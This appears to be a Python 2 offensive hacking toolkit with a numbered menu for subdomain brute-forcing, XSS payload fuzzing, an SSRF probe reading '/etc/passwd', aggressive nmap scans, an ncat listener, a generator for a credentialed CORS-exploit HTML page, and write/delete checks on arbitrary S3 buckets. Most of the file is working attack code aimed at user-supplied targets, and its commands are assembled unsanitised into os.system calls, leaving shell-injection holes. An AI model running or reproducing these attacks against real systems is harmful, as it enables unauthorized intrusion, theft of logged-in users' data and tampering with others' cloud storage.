#!/usr/bin/env python
# coding=utf-8
# !Author: Suleman Malik
# !Contact: samhax@protonmail.com

from __future__ import print_function

import httplib
import os
import random
import re
import socket
import ssl
import sys
import time
import urllib
import urlparse
from datetime import datetime
from string import whitespace
from threading import Thread

import dns.resolver
from colorama import *


def again():
    inp = raw_input("\n[e]xit or launch [a]gain? (e/a)").lower()
    if inp == 'a':
        repeat()
    elif inp == 'e':
        print("\nQuitting...")
    else:
        print("[!] Incorrect option selected")
        again()
def li():
    print("====================================")
def subd():
    version = "1"
    build = "0.1"
    try:
        import urllib.request as urllib2
    except ImportError:
        import urllib2
    # support for python 2.7 and 3
    try:
        import queue
    except:
        import Queue as queue
    # exit handler for signals.  So ctrl+c will work,  even with py threads.
    def killme(signum=0, frame=0):
        os.kill(os.getpid(), 9)
    class lookup(Thread):
        def __init__(self, in_q, out_q, domain, wildcard=False, resolver_list=[]):
            Thread.__init__(self)
            self.in_q = in_q
            self.out_q = out_q
            self.domain = domain
            self.wildcard = wildcard
            self.resolver_list = resolver_list
            self.resolver = dns.resolver.Resolver()
            if len(self.resolver.nameservers):
                self.backup_resolver = self.resolver.nameservers
            else:
                # we must have a resolver,  and this is the default resolver on my system...
                self.backup_resolver = ['127.0.0.1']
            if len(self.resolver_list):
                self.resolver.nameservers = self.resolver_list
        def check(self, host):
            slept = 0
            while True:
                try:
                    answer = self.resolver.query(host)
                    if answer:
                        return str(answer[0])
                    else:
                        return False
                except Exception as e:
                    if type(e) == dns.resolver.NXDOMAIN:
                        # not found
                        return False
                    elif type(e) == dns.resolver.NoAnswer or type(e) == dns.resolver.Timeout:
                        if slept == 4:
                            # This dns server stopped responding.
                            # We could be hitting a rate limit.
                            if self.resolver.nameservers == self.backup_resolver:
                                # if we are already using the backup_resolver use the resolver_list
                                self.resolver.nameservers = self.resolver_list
                            else:
                                # fall back on the system's dns name server
                                self.resolver.nameservers = self.backup_resolver
                        elif slept > 5:
                            # hmm the backup resolver didn't work,
                            # so lets go back to the resolver_list provided.
                            # If the self.backup_resolver list did work, lets stick with it.
                            self.resolver.nameservers = self.resolver_list
                            # I don't think we are ever guaranteed a response for a given name.
                            return False
                        # Hmm,  we might have hit a rate limit on a resolver.
                        time.sleep(1)
                        slept += 1
                        # retry...
                    elif type(e) == IndexError:
                        # Some old versions of dnspython throw this error,
                        # doesn't seem to affect the results,  and it was fixed in later versions.
                        pass
                    else:
                        # dnspython threw some strange exception...
                        raise e
        def run(self):
            while True:
                sub = self.in_q.get()
                #if sub != False:
                    #print 'Try: %s' % (sub)
                if not sub:
                    # Perpetuate the terminator for all threads to see
                    self.in_q.put(False)
                    # Notify the parent of our death of natural causes.
                    self.out_q.put(False)
                    break
                else:
                    try:
                        test = "%s.%s" % (sub, self.domain)
                        addr = self.check(test)
                        if addr and addr != self.wildcard:
                            test = (test, str(addr))
                            self.out_q.put(test)
                    except Exception as ex:
                        # do nothing
                        nothing = True
    # ++ FUNCTIONS //#
    # func Writelog
    def func_writelog(how, logloc, txt):  # how: a=append, w=new write
        with open(logloc, how) as mylog:
            mylog.write(txt)
    # Return a list of unique sub domains,  alfab. sorted .
    def extract_subdomains(file_name):
        subs = {}
        sub_file = open(file_name).read()
        # Only match domains that have 3 or more sections subdomain.domain.tld
        domain_match = re.compile("([a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*)+")
        f_all = re.findall(domain_match, sub_file)
        del sub_file
        for i in f_all:
            if i.find(".") >= 0:
                p = i.split(".")[0:-1]
                # gobble everything that might be a TLD
                while p and len(p[-1]) <= 3:
                    p = p[0:-1]
                # remove the domain name
                p = p[0:-1]
                # do we have a subdomain.domain left?
                if len(p) >= 1:
                    # print(str(p) + " : " + i)
                    for q in p:
                        if q:
                            # domain names can only be lower case.
                            q = q.lower()
                            if q in subs:
                                subs[q] += 1
                            else:
                                subs[q] = 1
        # Free some memory before the sort...
        del f_all
        # Sort by freq in desc order
        subs_sorted = sorted(subs.keys(), key=lambda x: subs[x], reverse=True)
        return subs_sorted
    def check_resolvers(file_name):
        txt = 'Checking sudomains...'
        print(txt)
        ret = []
        resolver = dns.resolver.Resolver()
        res_file = open(file_name).read()
        for server in res_file.split("\n"):
            server = server.strip()
            if server:
                resolver.nameservers = [server]
                try:
                    resolver.query("www.google.com")
                    # should throw an exception before this line.
                    ret.append(server)
                except:
                    pass
        return ret
    def run_target(target, hosts, resolve_list, thread_count, print_numeric):
        # The target might have a wildcard dns record...
        wildcard = False
        try:
            resp = dns.resolver.Resolver().query(
                "would never be a domain name" + str(random.randint(1, 9999)) + "." + target)
            wildcard = str(resp[0])
        except:
            pass
        in_q = queue.Queue()
        out_q = queue.Queue()
        for h in hosts:
            in_q.put(h)
        # Terminate the queue
        in_q.put(False)
        step_size = int(len(resolve_list) / thread_count)
        # Split up the resolver list between the threads.
        if step_size <= 0:
            step_size = 1
        step = 0
        for i in range(thread_count):
            threads.append(lookup(in_q, out_q, target, wildcard, resolve_list[step:step + step_size]))
            threads[-1].start()
        step += step_size
        if step >= len(resolve_list):
            step = 0
        threads_remaining = thread_count
        subdlist = {}
        subiplist = {}
        i = 0
        while True:
            try:
                d = out_q.get(True, 10)
                # we will get an empty exception before this runs.
                if not d:
                    threads_remaining -= 1
                else:
                    if not print_numeric:
                        txt = "%s" % (d[0])
                        func_writelog('a', logloc, txt + '\n')
                        #print txt
                    else:
                        txt = "%s -> %s" % (d[0], d[1])
                        func_writelog('a', logloc, txt + '\n')
                        # print(txt)
                        subdlist[i] = txt
                        if d[1] in subiplist.keys():
                            subiplist[d[1]].append(d[0])
                        else:
                            subiplist[d[1]] = [d[0]]
                        i += 1
            except queue.Empty:
                pass
            # make sure everyone is complete
            if threads_remaining <= 0:
                print(" ")
                print("Done. ")
                txt = 'Subdomains found : %s' % (len(subdlist))
                # Alfab. ordered result list
                func_writelog('a', logloc, '\n' + txt + '\nOrdered list:\n-------------\n')
                print(txt)
                print(' ')
                print('Ordered List:')
                for result in sorted(subdlist.values()):
                    txt = result
                    func_writelog('a', logloc, str(txt) + '\n')
                    print(txt)
                print(' ')
                # IP-ordered result list
                txt = "IP-ordered List:"
                func_writelog('a', logloc, '\n' + txt + '\n----------------\n')
                print(txt)
                for ips in subiplist:
                    txt = ips
                    func_writelog('a', logloc, str(txt) + '\n')
                    print(txt)
                    for ipssub in subiplist[ips]:
                        txt = "      |=> %s" % (ipssub)
                        func_writelog('a', logloc, str(txt) + '\n')
                        print(txt)

                end = datetime.now()
                time_stamp_end = int(time.time())
                duration = int(time_stamp_end) - int(time_stamp_start)
                time_end = str(end.year) + "-" + str(end.month) + "-" + str(end.day) + "    " + str(
                    end.hour) + ":" + str(end.minute) + ":" + str(end.second)
                txt = "Scan Ended : %s" % (time_end)
                txtB = "Duration : %ss" % (duration)
                func_writelog('a', logloc, '\n' + txt + '\n')
                func_writelog('a', logloc, txtB + '\n')
                print(" ")
                print(txt)
                print(txtB)
                break
    """
    ON FIRST RUN : SETTING UP BASIC FILES AND FOLDERS
    BEGIN:
    """
    # -- Creating default log directory
    logdir = "log"
    if not os.path.exists(logdir):
        os.makedirs(logdir)
        txt = "Directory 'log/' created"
        print(txt)
    """
    :END
    ON FIRST RUN : SETTING UP BASIC FILES AND FOLDERS
    """
    if __name__ == "__main__":
        # Target
        print("\n")
        target = raw_input("Target domain (eg. example.com) : ")
        # Subs
        subfiles = "", "subs/subs_xs.txt"
        choosensub = 1
        hosts = open(subfiles[int(choosensub)]).read().split("\n")
        # Action
        resolve_list = check_resolvers("cnf/resolvers.txt")
        threads = []
        # signal.signal(signal.SIGINT, killme)
        target = target.strip()
        if target:
            """ Every run : create log file """
            # -- Creating log file in directory 'log' --#
            now = datetime.now()
            time_stamp_start = int(time.time())
            time_start = str(now.year) + "-" + str(now.month) + "-" + str(now.day) + "    " + str(now.hour) + ":" + str(
                now.minute) + ":" + str(now.second)
            logfile = target.replace('.', '_') + '_' + str(now.year) + str(now.month) + str(now.day) + str(
                now.hour) + str(now.minute) + str(now.second) + ".log"
            print("Creating log : log/%s" % (logfile), end=' ')
            logloc = logdir + "/" + logfile
            with open(logloc, "w") as mylog:
                os.chmod(logloc, 0o660)
                mylog.write("Log created  - " + version + " build " + build + "\n\n")
                print(".... Done")
                print(" ")
            """ """
            txt = "Scan Started : %s" % (time_start)
            func_writelog('a', logloc, txt + '\n\n')
            print(txt)
            print(" ")
            # -- Visible IP --#
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            try:
                visible_ip = urllib2.urlopen('https://cleveridge.org/_exchange/open_files/return_ip.php?s=subd_scanner',
                                             context=ctx).read()
            except Exception:
                visible_ip = urllib2.urlopen('https://enabledns.com/ip', context=ctx).read()
            txt = "Visible IP : " + visible_ip
            func_writelog("a", logloc, txt + "\n\n")
            print(txt)
            print(' ')

            txt = "Subdomains in %s : " % (target)
            func_writelog('a', logloc, txt + '\n')
            print(txt)
            run_target(target, hosts, resolve_list, 10, True)
            repeat()
def xss():
    grey = Style.DIM + Fore.WHITE

    def wordlistimport(file, lst):
        try:
            with open(file, 'r') as f:  # Importing Payloads from specified wordlist.
                #print(Style.DIM + Fore.WHITE + "[+] Loading Payloads from default wordlist." + Style.RESET_ALL)
                for line in f:
                    final = str(line.replace("\n", ""))
                    lst.append(final)
        except IOError:
            print(Style.BRIGHT + Fore.RED + "[!] List not found!" + Style.RESET_ALL)
            again()
    def bg(p, status):
        try:
            b = ""
            l = ""
            lostatus = ""
            num = []
            s = len(max(p, key=len))  # list
            if s < 10:
                s = 10
            for i in range(len(p)): num.append(i)
            maxval = str(len(num))  # number
            for i in range(s): b = b + "-"
            for i in range(len(maxval)): l = l + "-"
            statuslen = len(max(status, key=len))
            for i in range(statuslen): lostatus = lostatus + "-"
            if len(b) < 10:
                b = "----------"
            if len(lostatus) < 14:
                lostatus = "--------------"
            if len(l) < 2:
                l = "--"
            los = statuslen
            if los < 14:
                los = 14
            lenb = len(str(len(b)))
            if lenb < 14:
                lenb = 10
            else:
                lenb = 20
            upb = ("+-%s-+-%s-+-%s-+") % (l, b, lostatus)
            print(upb)
            st0 = "Param"
            st1 = "Status"
            print("| + | " + st0.center(s, " ") + " | " + st1.center(los, " ") + " |")
            print(upb)
            for n, i, d in zip(num, p, status):
                string = (" %s | %s ") % (str(n), str(i))
                lofnum = str(n).center(int(len(l)), " ")
                lofstr = i.center(s, " ")
                lofst = d.center(los, " ")
                if "Not Vulnerable" in lofst:
                    lofst = Fore.GREEN + d.center(los, " ") + Style.RESET_ALL
                else:
                    lofst = Fore.RED + d.center(los, " ") + Style.RESET_ALL
                print("| " + lofnum + " | " + lofstr + " | " + lofst + " |")
                print(upb)
            return ("")
        except(ValueError):
            print(Style.BRIGHT + Fore.RED + "No parameters in URL!" + Style.RESET_ALL)
            again()
    def complete(p, r, c, d):
        if c == 0:
            print(
                        "[+] parameters are " + Style.BRIGHT + Fore.GREEN + "not vulnerable" + Style.RESET_ALL + " to XSS.")
        elif c == 1:
            print(("[+] %s Parameter is " + Style.BRIGHT + Fore.RED + "vulnerable" + Style.RESET_ALL + " to XSS.") % c)
        else:
            print(("[+] %s Parameters are " + Style.BRIGHT + Fore.RED + "vulnerable" + Style.RESET_ALL + " to XSS.") % c)
        print(("[+] Scan Result for %s:") % d)
        print(bg(p, r))
        again()
    def GET():
        try:
            try:
                grey = Style.DIM + Fore.WHITE
                site = raw_input("Enter URL (e.g https://example.com/?id=) : ")  # Taking URL
                if 'https://' in site:
                    pass
                elif 'http://' in site:
                    pass
                else:
                    site = "http://" + site
                finalurl = urlparse.urlparse(site)
                urldata = urlparse.parse_qsl(finalurl.query)
                domain0 = '{uri.scheme}://{uri.netloc}/'.format(uri=finalurl)
                domain = domain0.replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
                print (Style.DIM + Fore.WHITE + "[+] Checking if " + domain + " is available..." + Style.RESET_ALL)
                connection = httplib.HTTPConnection(domain)
                connection.connect()
                print("[+] " + Fore.GREEN + domain + " is available!!" + Style.RESET_ALL)
                url = site
                paraname = []
                paravalue = []
                wordlist = raw_input("Press return to continue...")
                if len(wordlist) == 0:
                    wordlist = 'wordlist.txt'
                    #deafult-word-list-for-xss
                else:
                    pass
                payloads = []
                wordlistimport(wordlist, payloads)
                lop = str(len(payloads))
                grey = Style.DIM + Fore.WHITE
                print("[+] " + lop + " Payloads loaded..")
                o = urlparse.urlparse(site)
                parameters = urlparse.parse_qs(o.query, keep_blank_values=True)
                path = urlparse.urlparse(site).scheme + "://" + urlparse.urlparse(site).netloc + urlparse.urlparse(
                    site).path
                for para in parameters:  # Arranging parameters and values.
                    for i in parameters[para]:
                        paraname.append(para)
                        paravalue.append(i)
                total = 0
                c = 0
                fpar = []
                fresult = []
                progress = 0
                for pn, pv in zip(paraname, paravalue):  # Scanning the parameter.
                    print("[+] Now checking '" + pn + "' param")
                    fpar.append(str(pn))
                    for x in payloads:  #
                        validate = x.translate(None, whitespace)
                        if validate == "":
                            progress = progress + 1
                        else:
                            sys.stdout.write("\r[+] %i / %s payloads tested." % (progress, len(payloads)))
                            sys.stdout.flush()
                            progress = progress + 1
                            enc = urllib.quote_plus(x)
                            data = path + "?" + pn + "=" + pv + enc
                            page = urllib.urlopen(data)
                            sourcecode = page.read()
                            if x in sourcecode:
                                print((
                                                 Style.BRIGHT + Fore.RED + "\n[!]" + " XSS Vulnerability Found! \n" + Fore.RED + Style.BRIGHT + "[!]" + " Parameter:\t%s\n" + Fore.RED + Style.BRIGHT + "[!]" + " Payload:\t%s" + Style.RESET_ALL) % (
                                     pn, x))
                                fresult.append("  Vulnerable  ")
                                c = 1
                                total = total + 1
                                progress = progress + 1
                                break
                            else:
                                c = 0
                    if c == 0:
                        print(( "\n[+] '%s' parameter not vulnerable." ) % pn)
                        fresult.append("Not Vulnerable")
                        progress = progress + 1
                        pass
                    progress = 0
                complete(fpar, fresult, total, domain)
            except(httplib.HTTPResponse, socket.error) as Exit:
                print(Style.BRIGHT + Fore.RED + "[!] Site " + domain + " is offline!" + Style.RESET_ALL)
                again()
        except(KeyboardInterrupt) as Exit:
            print("\nExit...")
    try:
        GET()
        #again()
    except(KeyboardInterrupt) as Exit:
        print("\nExit...")
cwd = os.getcwd()
def ban():
    with open('exp/ban.md', 'r') as myfile:
        print(myfile.read())
def repeat():
    ban()
    try:
        choice = int(input("\n\nchoice : "))
        if choice == 1:
            xss()
        elif choice == 2:
            ins = int(input("[1] Exploit\n[2] Update Pack\n\nChoice: "))
            if ins == 1:
                inp = raw_input("Search exploit (e.g wordpress) : ")
                print('\nSearching exploits...\n')
                time.sleep(5)
                os.system('cd exp;chmod 777 gs.py;./gs.py ' + inp)
                repeat()
            elif choice == 2:
                os.system('cd exp;./gs.py --update')
                repeat()
        elif choice == 3:
            subd()
        elif choice == 4:
            who = raw_input('Domain(e.g google.com): ')
            whois = os.system('curl http://api.hackertarget.com/whois/?q='+who)
            whois1=os.system('whois '+who)
            print(whois)
            li()
            print("GEOIP LOCATION")
            li()
            os.system('curl http://api.hackertarget.com/geoip/?q='+who)
            print("\n")
            li()
            repeat()
        elif choice == 5:
            ssrf = raw_input('URL(e.g http://robert-brook.com/parliament/index.php?page=): ')
            ssrf_result=os.system('curl %sfile:///etc/passwd ' % (ssrf))
            print(ssrf_result)
            print("\n For detail visit https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF")
            time.sleep(5)
            again()
        elif choice == 6:
            nmp = raw_input('Target Domain/IP (e.g www.google.com): ')
            li()
            print("\tRunning system nmap")
            li()
            os.system('nmap -sT -sV -sC -PN -A -T5 '+nmp)
            li()
            print("\tTCP PORT SCANING")
            li()
            os.system('curl http://api.hackertarget.com/nmap/?q='+nmp)
            li()
            print("\tSUBNET CALCULATION")
            li()
            os.system('curl https://api.hackertarget.com/subnetcalc/?q='+nmp)
            print("\n")
            again()
        elif choice == 7:
            ins = int(input("[1] Run program\n[2] Install Pack\n\nChoice: "))
            if ins == 1:
                fn = raw_input('File name (e.g test.js) :')
                print("\n Extracting Url from Js file...")
                li()
                time.sleep(5)
                os.system('ruby exp/urlex.rb exp/'+fn)
                li()
                repeat()
            elif ins == 2:
                os.system('brew install ruby')
                repeat()
            elif ins== 786687:
                url2 = raw_input('URL (e.g example.com) :')
                li()
                print("Searching links from "+url2)
                li()
                res=os.system('curl http://api.hackertarget.com/pagelinks/?q='+url2)
                print(res)
                li()
                repeat()
            else:
                print("")
                again()
        elif choice == 8:
           dom = raw_input('Target Domain(e.g google.com): ')
           dom2=' /'
           os.system('python exp/hc.py '+dom+dom2)
           print("-----------------------------------\n")
           repeat()
        elif choice == 9:
            ch=  int(input('\n[1] Run Listener \n[2] Install Package\n\nSelection:'))
            if ch==1:
                port=raw_input('Enter listening port: ')
                print("Incomming connection will be connected automatically on port %s")
                os.system('ncat -vv -n -l -p '+port)
            elif ch==2:
                os.system('git clone https://github.com/nmap/nmap')
                os.system('./configure;make;make install')
            else:
                print("Invalid number. Try again!!")
                again()
        elif choice == 10:
            print("Gathering information...")
            def net():
                li()
                print("\tLISTENING Connections")
                li()
                os.system('lsof -iTCP -sTCP:LISTEN -n -P')
                li()
                print("\tESTABLISHED Connections")
                li()
                os.system('lsof -s -i -n -P | grep ESTABLISHED')
                print("\n\n[1] Kill PID\n[2] Return to Menu")
                ch=int(input('\nSelection:'))
                if ch == 1:
                    pid = raw_input('Enter PID to kill: ')
                    os.system('kill ' + pid)
                    net()
                elif ch == 2:
                    repeat()
                else:
                    print("Invalid number. Try again!!")
                    again()
            net()
        elif choice == 11:
            cors = raw_input('Target Url (e.g https://api.edmodo.com/users/id): ')
            evil = raw_input('localhost/IP (e.g https://localhost): ')
            print("\nSite will be vulnerable to CORS misconfiguration if these 2 headers are present in the response")
            print("[1]Access-Control-Allow-Credentials: true")
            print("[2]Access-Control-Allow-Origin: %s" % (evil))
            li()
            os.system('curl %s -H "Origin: %s" -I ' % (cors, evil))
            exp= raw_input('\n[1]Exploit CORS on %s (y/n): ' % (cors)).lower()
            if exp=='y':
                print("Creating exploit code...")
                time.sleep(5)
                print("")
                f = open('Cors.html', 'w')
                body = """<!DOCTYPE html>
                <html>
                <head>
                <title>CORS PoC Exploit</title>
                </head>
                <body>
                <center>
                <h1>CORS Exploit<br>by HackB0x</h1>
                <hr>
                <div id=”demo”>
                <button type=”button” onclick=”cors()”>Exploit</button>
                </div>
                <script type=”text/javascript”>
                function cors() {
                var xhttp = new XMLHttpRequest();
                xhttp.onreadystatechange = function() {
                if(this.readyState == 4 && this.status == 200) {
                document.getElementById(“demo”).innerHTML = this.responseText;
                }
                };
                xhttp.open(“GET”, “%s", true);
                xhttp.withCredentials = true;
                xhttp.send();
                }
                </script>
                </center>
                </body>
                </html>""" % (cors)
                f.write(body)
                f.close()
                print("exploit created with the name of Cors.html in your current directory")
                li()
                print (Style.BRIGHT + Fore.GREEN + "Exploitation Steps"+ Style.RESET_ALL)
                print("[1] Start apache server on your local host\n[2] Paste cors.html in /var/www/html/")
                print("[3] Login to %s\n[4] Open cors.html using %s and click exploit" % (cors, evil))
                li()
                print("\nLoading main menu...")
                time.sleep(3)
                repeat()
            elif exp=='n':
                repeat()
            else:
                print("Invalid number. Try again!!")
                repeat()
        elif choice ==12:
            aws = int(input("[1]Install AWS Package\n[2]AWS Credential\n[3]Run Program\n\nSelection:"))
            if aws ==1:
                os.system('brew install awscli')
                os.system('pip install awscli')
                repeat()
            elif aws ==2:
                li()
                print("\t\tSample")
                li()
                print("""AWS Access Key ID: AKIAIOSFODNN7EXAMPLE
AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Default region name: us-west-2
Default output format: json""")
                print("\n\n")
                os.system('aws configure')
                repeat()
            elif aws ==3:
                aws_program = raw_input('S3 Bucket name (e.g rubyci.s3.amazonaws.com): ')
                print("\nChecking write permission. Creating test.txt to %s " % (aws_program))
                os.system('aws s3 cp exp/test.txt s3://%s' % (aws_program))
                time.sleep(5)
                print("\nTry Listing files from %s" % (aws_program))
                os.system('aws s3 ls s3://%s' % (aws_program))
                time.sleep(5)
                print("\nTry fetching file from %s." % (aws_program))
                os.system('aws s3 cp s3://%s/test.txt ./' % (aws_program))
                time.sleep(5)
                print("\nChecking remove permission. removing test.txt from %s" % (aws_program))
                os.system('aws s3 rm s3://%s/test.txt' % (aws_program))
                print("Process Done.\n")
                again()
            else:
                print("Invalid number. Try again!!")
                repeat()
        elif choice == 0:
            print("\nQuitting program...\n")
        else:
            print("Please enter the correct number")
            repeat()
    except:
        print("Error try again!!")
        repeat()
repeat()
